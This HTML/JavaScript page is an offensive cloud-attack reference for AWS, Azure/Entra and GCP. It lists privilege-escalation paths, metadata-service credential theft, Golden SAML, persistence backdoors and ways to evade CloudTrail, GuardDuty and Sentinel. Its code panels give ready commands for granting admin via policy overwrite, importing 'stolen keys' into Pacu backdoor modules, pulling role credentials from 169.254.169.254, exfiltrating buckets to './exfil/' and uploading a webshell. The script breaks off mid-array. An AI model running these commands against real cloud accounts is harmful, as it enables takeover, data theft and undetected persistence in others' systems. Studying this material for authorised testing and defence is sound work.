<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cloud Attacks Reference</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
.off{color:#ef4444;font-weight:600;font-size:.82em}
.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#f59e0b,#60a5fa,#34d399);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.hd .sub{font-size:.62em;color:#374151}
.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
.sb.on{background:#111318}
.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
.ct{padding:10px 14px;overflow-x:auto}
.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
.bx-b{padding:6px 10px}
.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
.fd .tp{color:#6b7280;font-size:.82em}
.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
.tg-s{padding:0 5px;font-size:.68em}
.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
.ct2:hover{background:#111827}
.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
.cv.op{transform:rotate(90deg)}
.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
.cb .cm{color:#4b5563}
.cb .pp{color:#f59e0b}
.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
.ti.op{border-color:#f9731640;background:#f9731608}
.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
.ti.op .tn{color:#fdba74}
.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
</style>
</head>
<body>
<div id="app"></div>
<script>
var $=function(s){return document.querySelector(s)};
var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
var SE=[
{id:"aim",l:"A. AWS IAM",i:"\u{1F511}",c:"#f59e0b"},
{id:"aws",l:"B. AWS Services",i:"\u2601\uFE0F",c:"#f87171"},
{id:"eid",l:"C. Azure / Entra",i:"\u{1F4AD}",c:"#60a5fa"},
{id:"azs",l:"D. Azure Services",i:"\u{1F4E6}",c:"#a78bfa"},
{id:"gcp",l:"E. GCP",i:"\u{1F7E2}",c:"#34d399"},
{id:"fed",l:"F. Multi-Cloud",i:"\u{1F504}",c:"#e879f9"},
{id:"per",l:"G. Persistence",i:"\u{1F512}",c:"#fbbf24"},
{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
];
var S={s:'aim',t:'flow'};
function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
function fAIM(){
var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">AWS IAM ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F50D}","IAM Enumeration","#f59e0b",
F("","aws sts get-caller-identity","")+F("","aws iam list-users / list-roles","")+F("","aws iam list-attached-user-policies --user X","")+F("","aws iam get-policy-version (read inline policies)","")+F("","Enumerate: users, groups, roles, policies, MFA",""));
h+=CRD("\u{1F4A5}","Privilege Escalation Paths","#f59e0b",
F("","iam:CreatePolicyVersion (overwrite policy)","")+F("","iam:SetDefaultPolicyVersion (activate old permissive version)","")+F("","iam:AttachUserPolicy / AttachRolePolicy (add admin)","")+F("","iam:PutUserPolicy / PutRolePolicy (inline policy)","")+F("","iam:CreateLoginProfile (set console password)","")+F("","iam:UpdateLoginProfile (change console password)","")+F("","iam:CreateAccessKey (new access key for any user)","")+F("","sts:AssumeRole (chain to more permissive role)","")+
'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 ~20+ documented IAM privesc paths. Check Rhino Security research.</div>');
h+=CRD("\u{1F504}","Role Chaining","#f59e0b",
F("","AssumeRole from one role to another","")+F("","Cross-account role assumption","")+F("","Role trust policy misconfiguration","")+F("","arn:aws:iam::*:root = ANY AWS account can assume","")+F("","Condition keys missing = overly permissive",""));
h+=CRD("\u{1F511}","Access Key Abuse","#f59e0b",
F("","Leaked keys: GitHub, .env files, CI/CD logs","")+F("","aws configure --profile stolen","")+F("","Check permissions: enumerate-iam.py","")+F("","Create new keys: aws iam create-access-key","")+F("","Keys don't expire (unless policy enforces)",""));
h+=CRD("\u{1F464}","STS Token Theft","#f59e0b",
F("","Temporary credentials from AssumeRole","")+F("","EC2 instance metadata: 169.254.169.254","")+F("","Lambda environment variables","")+F("","ECS task role credentials","")+F("","Duration: default 1hr, max 12hr",""));
h+='</div>';return h;
}

function fAWS(){
var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">AWS SERVICE ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F4E6}","S3 Bucket Abuse","#f87171",
F("","Public buckets: aws s3 ls s3://bucket --no-sign-request","")+F("","Misconfigured ACL: authenticated-users = ANY AWS account","")+F("","Bucket policy: Principal * = public access","")+F("","Upload webshell if writable","")+F("","Exfil: aws s3 sync s3://bucket ./local",""));
h+=CRD("\u{1F4BB}","EC2 Metadata Service (IMDS)","#f87171",
F("","http://169.254.169.254/latest/meta-data/","")+F("","IAM role creds: /meta-data/iam/security-credentials/ROLE","")+F("","Returns: AccessKeyId, SecretAccessKey, Token","")+F("","IMDSv2: requires PUT with token (X-aws-ec2-metadata-token-ttl-seconds)","")+F("","SSRF to metadata = credential theft",""));
h+=CRD("\u{1F4DC}","Lambda Exploitation","#f87171",
F("","Environment variables may contain secrets","")+F("","Lambda execution role: AssumeRole by Lambda service","")+F("","aws lambda get-function (download code + env vars)","")+F("","Inject into function code for persistence","")+F("","Layer poisoning: shared malicious layer",""));
h+=CRD("\u{1F510}","Secrets Manager / SSM","#f87171",
F("","aws secretsmanager list-secrets","")+F("","aws secretsmanager get-secret-value --secret-id X","")+F("","SSM Parameter Store: aws ssm get-parameters-by-path","")+F("","Often contains DB passwords, API keys","")+F("","ssm:SendCommand = remote code execution on EC2",""));
h+=CRD("\u{1F3D7}\uFE0F","CloudFormation / Terraform State","#f87171",
F("","CF templates may have hardcoded secrets","")+F("","aws cloudformation get-template --stack-name X","")+F("","Terraform state in S3: contains all outputs + secrets","")+F("","CF custom resources = Lambda execution","")+F("","Stack drift = unauthorized changes",""));
h+=CRD("\u{1F4CA}","CloudTrail Gaps","#f87171",
F("","Data events (S3, Lambda) not logged by default","")+F("","Some API calls not logged (sts:GetCallerIdentity pre-2019)","")+F("","Read-only vs management events","")+F("","Trail only in specific region (not global)","")+F("","Organizations trail vs account-level trail",""));
h+='</div>';return h;
}

function fEID(){
var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">AZURE / ENTRA ID ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F50D}","Entra ID Enumeration","#60a5fa",
F("","az ad user list / az ad group list","")+F("","az ad app list (app registrations)","")+F("","az ad sp list (service principals)","")+F("","Get-AzureADUser / Get-MgUser (MS Graph)","")+F("","ROADtools: roadrecon gather + GUI",""));
h+=CRD("\u{1F4BB}","App Registration Abuse","#60a5fa",
F("","Apps with Application permissions (not delegated)","")+F("","Client secret or certificate authentication","")+F("","App with Mail.ReadWrite.All = read all mailboxes","")+F("","Create new secret on existing app","")+F("","Consent grant attack: illicit consent",""));
h+=CRD("\u{1F511}","Managed Identity Exploitation","#60a5fa",
F("","System-assigned: tied to resource lifecycle","")+F("","User-assigned: independent, attached to multiple resources","")+F("","Token endpoint: 169.254.169.254 (VM) or IDENTITY_ENDPOINT (App Service)","")+F("","curl $IDENTITY_ENDPOINT?resource=https://management.azure.com","")+F("","Managed identity may have Reader/Contributor on subscription",""));
h+=CRD("\u{1F4DC}","Runbook / Automation Account","#60a5fa",
F("","Automation accounts run as service principal","")+F("","Run As account: high-priv certificate-based SP","")+F("","Runbooks execute PowerShell/Python in Azure","")+F("","Modify existing runbook for code execution","")+F("","Credential objects stored in automation account",""));
h+=CRD("\u{1F451}","Global Admin Escalation","#60a5fa",
F("","Entra ID Global Admin != Azure subscription access","")+F("","Elevate: User Access Administrator at root scope","")+F("","Portal: Properties -> Access management for Azure resources","")+F("","After elevation: Owner on all subscriptions","")+F("","Az CLI: az rest --method POST .../elevateAccess",""));
h+=CRD("\u{1F504}","PRT (Primary Refresh Token)","#60a5fa",
F("","Device-bound token for SSO across Azure/M365","")+F("","Equivalent of Kerberos TGT for Azure","")+F("","Extract with Mimikatz: sekurlsa::cloudap","")+F("","ROADtoken: extract PRT from joined device","")+F("","Use PRT to access any M365/Azure resource as user",""));
h+='</div>';return h;
}

function fAZS(){
var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">AZURE SERVICE ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F4E6}","Storage Account Exposure","#a78bfa",
F("","Public blob containers: https://acct.blob.core.windows.net/container?restype=container&comp=list","")+F("","Shared Access Signatures (SAS): time-limited URL tokens","")+F("","Over-permissive SAS with full account access","")+F("","Access keys: full storage account control","")+F("","az storage account keys list",""));
h+=CRD("\u{1F510}","Key Vault Secrets","#a78bfa",
F("","az keyvault list / az keyvault secret list","")+F("","az keyvault secret show --name X --vault-name Y","")+F("","Access policies: who can read secrets?","")+F("","Managed identity with Key Vault access = jackpot","")+F("","Certificates and keys also stored here",""));
h+=CRD("\u{1F4BB}","VM / Compute Abuse","#a78bfa",
F("","Custom Script Extension: execute on VM remotely","")+F("","az vm run-command invoke --command-id RunPowerShellScript","")+F("","VM disk snapshots: extract offline","")+F("","Serial console access if enabled","")+F("","Managed identity endpoint from within VM",""));
h+=CRD("\u{1F4DC}","Function Apps","#a78bfa",
F("","Similar to Lambda: serverless code execution","")+F("","App settings contain connection strings","")+F("","az functionapp config appsettings list","")+F("","Managed identity often assigned","")+F("","Deploy malicious function for persistence",""));
h+=CRD("\u{1F3D7}\uFE0F","ARM Templates","#a78bfa",
F("","Deployment history contains template + parameters","")+F("","az deployment group list / show","")+F("","Parameters may include passwords in cleartext","")+F("","secureString parameters not always used properly","")+F("","Template spec access = infrastructure knowledge",""));
h+=CRD("\u{1F4E7}","Microsoft 365 / Graph API","#a78bfa",
F("","Graph API: https://graph.microsoft.com/v1.0/","")+F("","Read mail: /me/messages or /users/X/messages","")+F("","SharePoint: /sites/root/drive/items","")+F("","Teams messages: /teams/X/channels/Y/messages","")+F("","With app permissions: access any user's data",""));
h+='</div>';return h;
}

function fGCP(){
var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">GCP ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F511}","Service Account Abuse","#34d399",
F("","Default SA: PROJECT_NUMBER-compute@developer.gserviceaccount.com","")+F("","Key file: JSON with private key (never expires)","")+F("","gcloud auth activate-service-account --key-file=key.json","")+F("","Token from metadata: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token","")+F("","Impersonation: --impersonate-service-account",""));
h+=CRD("\u{1F4BB}","Compute Metadata","#34d399",
F("","http://metadata.google.internal/computeMetadata/v1/","")+F("","Header required: Metadata-Flavor: Google","")+F("","SA token: /instance/service-accounts/default/token","")+F("","Project-level metadata: custom SSH keys","")+F("","Instance attributes: startup-script content",""));
h+=CRD("\u{1F4E6}","Storage Buckets","#34d399",
F("","gsutil ls gs://bucket-name","")+F("","Public: allUsers or allAuthenticatedUsers","")+F("","Uniform bucket-level access vs ACL","")+F("","Bucket policy only (no object-level ACL)","")+F("","gsutil cp gs://bucket/secret.txt ./",""));
h+=CRD("\u{1F504}","IAM Privilege Escalation","#34d399",
F("","iam.serviceAccounts.getAccessToken (impersonate any SA)","")+F("","iam.serviceAccountKeys.create (new key for any SA)","")+F("","iam.roles.update (escalate custom role)","")+F("","deploymentmanager.deployments.create (deploy as SA)","")+F("","cloudfunctions.functions.create (execute as SA)",""));
h+=CRD("\u{1F30D}","Organization-Level","#34d399",
F("","Org policies: restrictions at org/folder level","")+F("","Org admin = godmode across all projects","")+F("","Folder-level IAM bindings","")+F("","Billing account access: create projects","")+F("","gcloud organizations list / get-iam-policy",""));
h+=CRD("\u{1F4DC}","Cloud Functions / Cloud Run","#34d399",
F("","Serverless execution environment","")+F("","Attached service account permissions","")+F("","Environment variables with secrets","")+F("","Source code downloadable if authorized","")+F("","Deploy malicious function for code execution",""));
h+='</div>';return h;
}
function fFED(){
var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">MULTI-CLOUD / FEDERATION ATTACKS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F504}","SAML Token Forgery (Golden SAML)","#e879f9",
F("","Steal ADFS token-signing certificate","")+F("","Forge SAML assertion for any user","")+F("","Authenticate to any federated service (AWS, Azure, GCP)","")+F("","No MFA check (assertion is post-auth)","")+F("","AADInternals: New-AADIntSAMLToken","")+
'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 Persists until signing cert is rotated. SolarWinds-style.</div>');
h+=CRD("\u{1F511}","OIDC Federation Abuse","#e879f9",
F("","AWS: IAM OIDC identity providers","")+F("","GitHub Actions OIDC -> AWS role assumption","")+F("","Misconfigured trust: any repo can assume role","")+F("","Azure: Workload identity federation","")+F("","GCP: Workload identity pool misconfig",""));
h+=CRD("\u{1F3AB}","Token Theft & Replay","#e879f9",
F("","Azure: access tokens from az account get-access-token","")+F("","AWS: STS temporary credentials from metadata","")+F("","GCP: OAuth2 tokens from metadata server","")+F("","Tokens usable from any IP (usually no IP binding)","")+F("","JWT decode: jwt.io for claim inspection",""));
h+=CRD("\u{1F30D}","Cross-Cloud Pivoting","#e879f9",
F("","AWS keys in Azure Key Vault (or vice versa)","")+F("","CI/CD pipeline with multi-cloud creds","")+F("","Terraform state with cross-cloud secrets","")+F("","Service mesh connecting cloud environments","")+F("","Shared secrets in environment variables",""));
h+=CRD("\u{1F4E7}","Entra ID to M365 to Azure","#e879f9",
F("","Compromise Entra ID user \u2192 M365 access","")+F("","M365 Global Admin \u2192 elevate to Azure access","")+F("","Azure Reader \u2192 find creds in resources","")+F("","Azure Contributor \u2192 code execution on VMs","")+F("","Full chain: phished creds \u2192 cloud admin",""));
h+=CRD("\u{1F504}","On-Prem to Cloud Pivot","#e879f9",
F("","Azure AD Connect: sync account has DCSync-equivalent","")+F("","ADFS: token-signing cert enables Golden SAML","")+F("","Hybrid-joined devices: PRT extraction","")+F("","Azure Arc: on-prem servers managed from cloud","")+F("","AWS SSM: cloud-managed on-prem agents",""));
h+='</div>';return h;
}

function fPER(){
var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">CLOUD PERSISTENCE</div>';
h+='<div class="grd">';
h+=CRD("\u{1F511}","AWS Persistence","#fbbf24",
F("","Create new IAM user with access keys","")+F("","Add access key to existing user","")+F("","Backdoor role trust policy (cross-account)","")+F("","Lambda function triggered on CloudTrail events","")+F("","EC2 instance with persistent IAM role","")+F("","SSM document for persistent code execution",""));
h+=CRD("\u{1F4AD}","Azure / Entra ID Persistence","#fbbf24",
F("","Add secret/certificate to app registration","")+F("","Create new service principal","")+F("","Federated credential on app (no secret needed)","")+F("","Automation account runbook (scheduled)","")+F("","Azure Function with timer trigger","")+F("","Invite external B2B user (stealth admin)",""));
h+=CRD("\u{1F7E2}","GCP Persistence","#fbbf24",
F("","Create new service account key","")+F("","Deploy Cloud Function with timer trigger","")+F("","Add IAM binding to project/org","")+F("","Compute instance with startup script","")+F("","Custom IAM role with hidden permissions",""));
h+=CRD("\u{1F504}","Cross-Cloud Persistence","#fbbf24",
F("","Golden SAML: forge tokens indefinitely","")+F("","Backdoor OIDC federation trust","")+F("","Store persistence creds in other cloud","")+F("","CI/CD pipeline backdoor (GitHub Actions, etc.)","")+F("","Terraform state modification (add resources)",""));
h+=CRD("\u{1F4E1}","Event-Triggered Persistence","#fbbf24",
F("","AWS: CloudWatch Events -> Lambda on CreateUser","")+F("","Azure: Event Grid subscription","")+F("","GCP: Cloud Audit Log sink -> Cloud Function","")+F("","Re-create deleted backdoor automatically","")+F("","Self-healing persistence that survives cleanup",""));
h+=CRD("\u{1F47B}","Stealth Techniques","#fbbf24",
F("","Use existing service account (don't create new)","")+F("","Modify existing role (don't create new)","")+F("","Attach inline policy (harder to find than managed)","")+F("","Short descriptions matching legitimate resources","")+F("","Tag resources to blend with existing infra",""));
h+='</div>';return h;
}

function fKIT(){
var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">CLOUD SECURITY TOOLS</div>';
h+='<div class="grd" style="margin-bottom:10px">';
var tools=[
{n:"Pacu",d:"AWS exploitation framework. Modules for enumeration, privesc, persistence, exfil. pacu > run iam__enum_permissions.",c:"#f59e0b",r:"AWS"},
{n:"Prowler",d:"AWS/Azure/GCP security assessment. CIS benchmark checks. prowler aws / prowler azure.",c:"#60a5fa",r:"Multi"},
{n:"ScoutSuite",d:"Multi-cloud security auditing. Web report. scout --provider aws --profile stolen.",c:"#34d399",r:"Multi"},
{n:"ROADtools",d:"Azure AD enumeration + exploitation. roadrecon gather -> roadrecon gui. Full tenant dump.",c:"#60a5fa",r:"Azure"},
{n:"AADInternals",d:"Azure AD / M365 PowerShell toolkit. Golden SAML, token manipulation, tenant recon.",c:"#a78bfa",r:"Azure"},
{n:"enumerate-iam",d:"Brute-force AWS permissions. Tests every API call. Shows what stolen keys can do.",c:"#f59e0b",r:"AWS"},
{n:"Cloudfox",d:"AWS/Azure/GCP attack surface enumeration. cloudfox aws all-checks.",c:"#34d399",r:"Multi"},
{n:"GraphRunner",d:"Microsoft Graph API exploitation. Enum users, mail, SharePoint, Teams.",c:"#60a5fa",r:"Azure"},
{n:"GCPBucketBrute",d:"GCP bucket enumeration and permission testing. Finds public/accessible buckets.",c:"#34d399",r:"GCP"},
{n:"cf-domain-takeover",d:"Check for dangling DNS pointing to unclaimed cloud resources (S3, Azure, etc.).",c:"#f87171",r:"Multi"}
];
tools.forEach(function(x){
h+='<div style="border-radius:6px;border:1px solid '+x.c+'20;background:'+x.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+x.c+';font-size:.76em">'+x.n+'</span><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+x.r+'</span></div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+x.d+'</div></div>';
});
h+='</div>';
h+=N("ENUMERATION ORDER","#f472b6","<b>1.</b> sts get-caller-identity / az account show <b>2.</b> Enumerate permissions (enumerate-iam/Pacu) <b>3.</b> Check metadata service <b>4.</b> List storage/secrets <b>5.</b> Map IAM roles/policies <b>6.</b> Find privesc paths <b>7.</b> Check federation/trusts");
return h;
}

function fBYP(){
var h='<div class="grd">';
h+=CRD("\u{1F6E1}\uFE0F","CloudTrail Evasion (AWS)","#fb923c",
F("","Data events (S3 GetObject) not logged by default","")+F("","Some API calls not in CloudTrail at all","")+F("","Use read-only calls for recon (lower alert priority)","")+F("","Regions without CloudTrail configured","")+F("","Delete/stop trail (if you have permissions)","")+F("","Event selectors may exclude specific events",""));
h+=CRD("\u{1F4CA}","GuardDuty Evasion (AWS)","#fb923c",
F("","Avoid known GuardDuty finding types","")+F("","Reconnaissance from same VPC (internal, not flagged)","")+F("","Use existing IAM entities (not new ones)","")+F("","Slow enumeration (avoid rate-based detections)","")+F("","GuardDuty doesn't cover all API calls","")+F("","Disable GuardDuty (if admin, noisy but effective)",""));
h+=CRD("\u{1F50D}","Azure Sentinel / Defender Evasion","#fb923c",
F("","Sentinel relies on Log Analytics workspace data","")+F("","Not all logs ingested (cost-based decisions)","")+F("","Use Azure CLI instead of Portal (different logging)","")+F("","Graph API calls may have less monitoring","")+F("","Conditional Access: comply with policy to avoid flags",""));
h+=CRD("\u{1F512}","SCP / Permission Boundary Bypass","#fb923c",
F("","SCPs apply to member accounts, not management account","")+F("","Permission boundaries limit max permissions","")+F("","Neither restrict the root user of management account","")+F("","Resource-based policies can bypass boundaries","")+F("","SCP doesn't prevent sts:AssumeRole to unrestricted role",""));
h+=CRD("\u{1F4E1}","IMDSv2 Bypass","#fb923c",
F("","IMDSv2 requires PUT for token, then GET with token","")+F("","Blocks simple SSRF (GET-only)","")+F("","Bypass: if SSRF allows PUT requests","")+F("","Bypass: if application proxies arbitrary HTTP methods","")+F("","Some services still allow IMDSv1 fallback",""));
h+=CRD("\u{1F47B}","Assume Role Logging Gaps","#fb923c",
F("","AssumeRole logged in source and target account","")+F("","But: user-agent / IP may not be monitored","")+F("","Cross-account assumed role: target sees source account ID","")+F("","Session names can be arbitrary (blend in)","")+F("","Use legitimate session name patterns",""));
h+='</div>';return h;
}
function getCodes(s){
var C={};
C.aim=[
{t:"AWS IAM privilege escalation: CreatePolicyVersion",l:"aws",c:"# Check current permissions:\naws iam list-attached-user-policies --user-name compromised-user\naws iam list-user-policies --user-name compromised-user\n\n# If we have iam:CreatePolicyVersion on a managed policy:\n# Create new permissive policy version and set as default\naws iam create-policy-version \\\n    --policy-arn arn:aws:iam::123456789:policy/OurPolicy \\\n    --policy-document '{\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [{\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n    }' \\\n    --set-as-default\n\n# Now we have admin access via the modified policy\n# Verify:\naws sts get-caller-identity\naws iam list-users\naws s3 ls\n\n# Other privesc paths:\n# iam:AttachUserPolicy -> attach AdministratorAccess\naws iam attach-user-policy --user-name compromised \\\n    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# iam:CreateAccessKey -> key for any user\naws iam create-access-key --user-name admin-user"},
{t:"Enumerate permissions with Pacu",l:"aws",c:"# Install and configure Pacu\npip3 install pacu\npacu\n\n# Import stolen keys\nPacu > import_keys stolen-key\n# Enter: Access Key ID, Secret Access Key, (Session Token)\n\n# Enumerate permissions\nPacu > run iam__enum_permissions\n# Tests API calls to determine what you can do\n\n# Enumerate everything reachable\nPacu > run iam__enum_users_roles_policies_groups\nPacu > run ec2__enum\nPacu > run s3__enum\nPacu > run lambda__enum\n\n# Check for privesc paths\nPacu > run iam__privesc_scan\n# Reports exploitable IAM misconfigurations\n\n# Exploit privesc\nPacu > run iam__privesc_scan --exploit\n\n# Persistence\nPacu > run iam__backdoor_users_keys\nPacu > run iam__backdoor_assume_role"},
{t:"Cross-account role assumption",l:"aws",c:"# Discover assumable roles:\naws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}'\n\n# Check trust policy for overly permissive:\n# \"Principal\": {\"AWS\": \"*\"}  <- ANY account can assume!\n# \"Principal\": {\"AWS\": \"arn:aws:iam::123456:root\"} <- specific account\n\n# Assume the role:\naws sts assume-role \\\n    --role-arn arn:aws:iam::TARGET_ACCOUNT:role/OverlyPermissiveRole \\\n    --role-session-name attacker-session\n\n# Returns: AccessKeyId, SecretAccessKey, SessionToken\n# Export and use:\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\n\n# Verify new identity:\naws sts get-caller-identity\n# Should show TARGET_ACCOUNT and assumed role\n\n# Chain: Role A -> Role B -> Role C\n# Each hop may grant additional permissions"}
];
C.aws=[
{t:"EC2 metadata credential theft (SSRF)",l:"aws",c:"# IMDSv1 (simple GET - older instances):\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Returns role name, then:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n# Returns: AccessKeyId, SecretAccessKey, Token, Expiration\n\n# IMDSv2 (token-based - newer instances):\nTOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token \\\n    -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n\n# Other useful metadata:\ncurl .../latest/meta-data/hostname\ncurl .../latest/meta-data/local-ipv4\ncurl .../latest/user-data  # startup scripts may contain secrets!\ncurl .../latest/meta-data/iam/info  # instance profile ARN\n\n# Use stolen creds from attacker machine:\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws sts get-caller-identity"},
{t:"S3 bucket enumeration and exfil",l:"aws",c:"# Check for public access:\naws s3 ls s3://target-bucket --no-sign-request\n\n# Authenticated access (any AWS account if ACL misconfigured):\naws s3 ls s3://target-bucket --profile any-aws-account\n\n# Download everything:\naws s3 sync s3://target-bucket ./exfil/ --no-sign-request\n\n# Check bucket policy:\naws s3api get-bucket-policy --bucket target-bucket\n\n# Check ACL:\naws s3api get-bucket-acl --bucket target-bucket\n# Dangerous: \"AllUsers\" or \"AuthenticatedUsers\" grantee\n\n# Upload if writable (webshell, backdoor):\naws s3 cp shell.php s3://target-bucket/shell.php\n\n# Bucket discovery:\n# Wordlist: company-backup, company-data, company-dev\n# Tools: cloud_enum, S3Scanner, bucket_finder\n\n# Secrets in buckets:\n# .env files, .git directories, terraform.tfstate\n# Database backups, SSH keys, API credentials"},
